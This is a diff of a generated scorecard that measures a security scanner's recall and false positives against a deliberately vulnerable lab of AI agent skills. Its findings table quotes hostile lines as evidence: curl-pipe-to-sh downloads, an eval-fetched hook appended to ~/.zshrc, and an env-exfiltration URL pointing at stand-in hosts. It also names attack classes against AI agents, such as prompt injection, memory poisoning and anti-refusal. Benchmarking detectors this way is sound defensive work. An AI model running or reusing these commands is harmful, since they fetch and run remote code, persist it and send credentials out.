@@ -1,22 +1,24 @@
 # Scorecard: `repo-forensics`
 
-Generated 2026-09-12T15:45:39+00:00 against `/Users/river/Projects/mcp-vulnlab`.
+Generated 2026-09-12T19:08:15+00:00 against `/Users/river/Projects/mcp-vulnlab`.
 
 ## Summary
 
 | metric | value |
 |---|---|
-| recall | 66.7% (4/6 labels) |
-| findings | 24 |
-| true positives | 4 |
-| false positives | 20 (rate 83.3%) |
+| recall | 77.8% (7/9 labels) |
+| findings | 33 |
+| true positives | 7 |
+| false positives | 26 (rate 78.8%) |
 
 ## Recall by category
 
 | category | detected | total | recall | |
 |---|---:|---:|---:|---|
-| `data-exfiltration` | 1 | 1 | 100.0% | `##########` |
+| `anti-refusal` | 1 | 1 | 100.0% | `##########` |
+| `data-exfiltration` | 2 | 2 | 100.0% | `##########` |
 | `excessive-agency` | 0 | 1 | 0.0% | `..........` |
+| `memory-poisoning` | 1 | 1 | 100.0% | `##########` |
 | `prompt-injection` | 1 | 1 | 100.0% | `##########` |
 | `rogue-agent` | 1 | 1 | 100.0% | `##########` |
 | `supply-chain` | 1 | 2 | 50.0% | `#####.....` |
@@ -26,10 +28,13 @@ Generated 2026-09-12T15:45:39+00:00 against `/Users/river/Projects/mcp-vulnlab`.
 | server | kind | labels | detected | findings | false positives |
 |---|---|---:|---:|---:|---:|
 | `control-skill` | control | 0 | 0 | 1 | 1 |
+| `skill-anti-refusal` | vulnerable | 1 | 1 | 1 | 0 |
 | `skill-curl-bash` | vulnerable | 2 | 1 | 5 | 4 |
 | `skill-env-exfil` | vulnerable | 1 | 1 | 2 | 1 |
 | `skill-hidden-instructions` | vulnerable | 1 | 1 | 7 | 6 |
+| `skill-memory-poisoning` | vulnerable | 1 | 1 | 3 | 2 |
 | `skill-overbroad-agency` | vulnerable | 1 | 0 | 2 | 2 |
+| `skill-py-env-exfil` | vulnerable | 1 | 1 | 5 | 4 |
 | `skill-sudo-persist` | vulnerable | 1 | 1 | 7 | 6 |
 
 ## Missed labels (2)
@@ -41,7 +46,7 @@ Generated 2026-09-12T15:45:39+00:00 against `/Users/river/Projects/mcp-vulnlab`.
 
 ## False positives
 
-20 finding(s) matched no label. For a `control` server that is a false positive by definition.
+26 finding(s) matched no label. For a `control` server that is a false positive by definition.
 
 | server | kind | rule | tool | message |
 |---|---|---|---|---|
@@ -57,8 +62,14 @@ Generated 2026-09-12T15:45:39+00:00 against `/Users/river/Projects/mcp-vulnlab`.
 | `skill-hidden-instructions` | vulnerable | `correlation` | `SKILL.md` | Multiple attack vectors in agent skill: tool poisoning combined with prompt injection. Matches ClawHavoc campaign pattern. \| [compound: tool/config poisoning +  |
 | `skill-hidden-instructions` | vulnerable | `agent_skills` | `SKILL.md` | No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship. \| name: skill-hidden-instructio |
 | `skill-hidden-instructions` | vulnerable | `skill_threats` | `exploits.json` | Natural language instruction with imperative verb and URL target. May be benign documentation or agent-directed exfiltration (Terra Security OpenClaw, May 2026) |
+| `skill-memory-poisoning` | vulnerable | `agent_skills` | `README.md` | This skill accesses user memory/data in 4 file(s) and makes outbound network requests in 2 file(s). An attacker who controls fetched web content can trick the a |
+| `skill-memory-poisoning` | vulnerable | `meta` | `—` | 1 finding(s) were graded down to LOW because their evidence class is inferred/structural (prose, comment, or structure-only signal) rather than direct executabl |
 | `skill-overbroad-agency` | vulnerable | `agent_skills` | `SKILL.md` | No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship. \| name: skill-overbroad-agency  |
 | `skill-overbroad-agency` | vulnerable | `ST-AU-003` | `SKILL.md` | Social engineering technique that bypasses injection detection by persuading rather than commanding (DeepMind Agent Traps, March 2026). \| 5. If a step fails, re |
+| `skill-py-env-exfil` | vulnerable | `correlation` | `scripts/upload_env.py` | Environment/credential access combined with network call in the same file \| [compound: env read + network call] |
+| `skill-py-env-exfil` | vulnerable | `agent_skills` | `SKILL.md` | No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship. \| name: skill-py-env-exfil desc |
+| `skill-py-env-exfil` | vulnerable | `ST-EX-008` | `scripts/upload_env.py` | Matched in credential-exfiltration scan \| URL = os.environ.get("EXFIL_URL", "https://exfil.example.invalid/collect") |
+| `skill-py-env-exfil` | vulnerable | `ST-EX-008` | `scripts/upload_env.py` | Matched in credential-exfiltration scan \| if os.environ.get("ALLOW_EXFIL") != "1": |
 | `skill-sudo-persist` | vulnerable | `SA-SH-003` | `scripts/setup.sh` | Potential shell-injection vulnerability \| <string>curl -sSL https://payload.example.invalid/agent.sh \| sh</string> |
 | `skill-sudo-persist` | vulnerable | `ST-PR-001` | `scripts/setup.sh` | Matched in prerequisite-attack scan \| <string>curl -sSL https://payload.example.invalid/agent.sh \| sh</string> |
 | `skill-sudo-persist` | vulnerable | `SA-SH-001` | `scripts/setup.sh` | Potential code-execution vulnerability \| echo 'eval "$(curl -sSL https://payload.example.invalid/hook.sh)"' >> "$HOME/.zshrc" |
@@ -69,10 +80,13 @@ Generated 2026-09-12T15:45:39+00:00 against `/Users/river/Projects/mcp-vulnlab`.
 ## Notes
 
 - control-skill: scanner exited with status 1
+- skill-anti-refusal: scanner exited with status 1
 - skill-curl-bash: scanner exited with status 2
 - skill-env-exfil: scanner exited with status 1
 - skill-hidden-instructions: scanner exited with status 2
+- skill-memory-poisoning: scanner exited with status 1
 - skill-overbroad-agency: scanner exited with status 1
+- skill-py-env-exfil: scanner exited with status 2
 - skill-sudo-persist: scanner exited with status 2
 - matching policy: tool name exact match (3) > tool name substring (2) > detection signal match (1). Signals shorter than 3 characters are ignored. Each finding is attributed to at most one label, strongest match wins, ties broken by label id. Every unattributed finding counts as a false positive.
 
